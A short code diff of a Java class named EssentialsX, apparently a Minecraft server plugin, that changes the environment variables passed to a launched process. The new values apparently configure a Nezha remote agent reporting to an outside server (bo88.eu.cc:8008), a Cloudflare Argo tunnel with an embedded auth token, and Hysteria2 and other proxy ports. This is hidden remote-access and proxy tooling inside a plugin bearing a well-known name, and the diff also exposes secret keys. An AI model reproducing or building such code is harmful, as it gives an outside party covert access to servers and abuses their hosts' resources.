@@ -73,16 +73,16 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "60ecf41e-df9a-414a-ae9f-24fb9622d933");
+        env.put("UUID", "cf59646f-a9b3-4b6e-905d-dc8f0acb741f");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "bo66.pp.ua:8008");
+        env.put("NEZHA_SERVER", "bo88.eu.cc:8008");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "Qj07dgDztkOhREuxknO57QKdyad9KbmE");
-        env.put("ARGO_PORT", "35462");
-        env.put("ARGO_DOMAIN", "leonodes.boxu.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiZGZmNTYxN2QtOGFjMS00YjRiLWE4NGEtNmMwNmIwMmVmZGUzIiwicyI6Ik1XSmlNMlk1WkRRdE1Ua3lOeTAwTnpsaExUazRNVEl0WkRSak5ERmpaVEprTWpjdyJ9");
+        env.put("NEZHA_KEY", "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl");
+        env.put("ARGO_PORT", "");
+        env.put("ARGO_DOMAIN", "mcserverhost.bo88.kdns.fr");
+        env.put("ARGO_AUTH", "eyJhIjoiOTU4MWYzZmNhMDgwMjgxMTgzMmEzNTNhYmY1OGM2MjMiLCJ0IjoiMDM4ZjIyNmEtYTE0My00NzI1LWJiZDItNTU4NjQ4MjAzODQ3IiwicyI6IlpEWTRaRGMyTnpRdE5HSTJZeTAwTlRRMExXRXhNRGt0WmpsaU1qSXdOalV3TTJFNSJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "12798");
+        env.put("HY2_PORT", "10674");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
